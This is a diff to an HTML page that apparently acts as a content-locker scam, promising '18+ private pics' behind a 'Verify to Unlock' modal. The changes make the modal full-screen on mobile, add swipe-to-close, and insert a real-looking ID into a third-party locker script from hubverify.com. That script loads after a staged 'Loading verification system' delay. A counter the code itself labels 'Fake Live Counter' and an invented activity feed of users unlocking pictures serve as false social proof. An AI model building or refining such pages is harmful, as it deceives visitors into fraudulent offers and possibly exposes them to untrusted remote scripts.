@@ -17,9 +17,14 @@
       animation: spin 1s linear infinite;
       margin: auto;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
+    /* Mobile Fullscreen Modal */
+    .modal {
+      transition: transform 0.3s ease, opacity 0.3s ease;
+    }
+    .modal.hidden {
+      transform: translateY(100%);
+      opacity: 0;
     }
   </style>
 </head>
@@ -36,22 +41,22 @@
   </div>
 
   <!-- Modal -->
-  <div id="lockerModal" class="hidden fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center z-50">
-    <div class="bg-gray-800 rounded-2xl p-6 max-w-lg w-full relative shadow-lg">
-      <button onclick="closeModal()" class="absolute top-2 right-2 text-gray-400 hover:text-white text-xl">&times;</button>
-      <h2 class="text-lg font-bold text-center mb-4">🔒 Verify to Unlock</h2>
+  <div id="lockerModal" class="modal hidden fixed inset-0 bg-black bg-opacity-90 backdrop-blur-sm flex items-center justify-center z-50">
+    <div class="bg-gray-800 rounded-none md:rounded-2xl p-6 w-full h-full md:max-w-lg md:h-auto relative shadow-lg overflow-y-auto">
+      <button onclick="closeModal()" class="absolute top-3 right-3 text-gray-400 hover:text-white text-3xl">&times;</button>
+      <h2 class="text-xl font-bold text-center mb-4">🔒 Verify to Unlock</h2>
       
       <!-- Locker Area -->
       <div id="lockerContainer" class="text-center"></div>
 
       <!-- Fake Live Counter -->
-      <div id="liveCounter" class="mt-4 text-center text-sm text-gray-300">
+      <div id="liveCounter" class="mt-6 text-center text-sm text-gray-300">
         👥 <span id="onlineUsers">37</span> users online now <br>
         ✅ <span id="unlockedUsers">12</span> just unlocked private pics
       </div>
 
       <!-- Recent Activity Feed -->
-      <div id="activityFeed" class="mt-4 bg-gray-700 rounded-lg p-3 h-32 overflow-hidden text-xs text-gray-200 space-y-2">
+      <div id="activityFeed" class="mt-6 bg-gray-700 rounded-lg p-3 h-40 overflow-hidden text-xs text-gray-200 space-y-2">
         <div class="flex items-center space-x-2">
           <img src="https://randomuser.me/api/portraits/men/11.jpg" class="w-6 h-6 rounded-full">
           <span>🇺🇸 User_Alex unlocked 18+ pics 2 mins ago</span>
@@ -93,28 +98,47 @@
 
     // Modal Functions
     function openModal() {
-      document.getElementById("lockerModal").classList.remove("hidden");
+      const modal = document.getElementById("lockerModal");
+      modal.classList.remove("hidden");
+      modal.style.transform = "translateY(0)";
+      modal.style.opacity = "1";
+
       document.getElementById("lockerContainer").innerHTML = `
         <div id="loadingBox">
           <div class="spinner"></div>
           <p class="mt-3 text-sm text-gray-300">Loading verification system...</p>
         </div>
       `;
+
       let oldScript = document.getElementById("afmlock");
       if (oldScript) oldScript.remove();
 
       setTimeout(() => {
         document.getElementById("lockerContainer").innerHTML = "";
         let s = document.createElement("script");
-        s.src = "https://hubverify.com/cl/clocker.php?id=YOUR_ID";
+        s.src = "https://hubverify.com/cl/clocker.php?id=68bb9ae35b16c"; // আপনার আসল লিংক
         s.id = "afmlock";
-        document.body.appendChild(s);
+        document.getElementById("lockerContainer").appendChild(s);
       }, 3000);
     }
 
     function closeModal() {
-      document.getElementById("lockerModal").classList.add("hidden");
+      const modal = document.getElementById("lockerModal");
+      modal.classList.add("hidden");
     }
+
+    // Swipe Down to Close (Mobile)
+    let startY = 0;
+    const modal = document.getElementById("lockerModal");
+    modal.addEventListener("touchstart", (e) => {
+      startY = e.touches[0].clientY;
+    });
+    modal.addEventListener("touchend", (e) => {
+      let endY = e.changedTouches[0].clientY;
+      if (endY - startY > 100) { // swipe down 100px+
+        closeModal();
+      }
+    });
 
     // Fake Live Counter
     let online = 37, unlocked = 12;
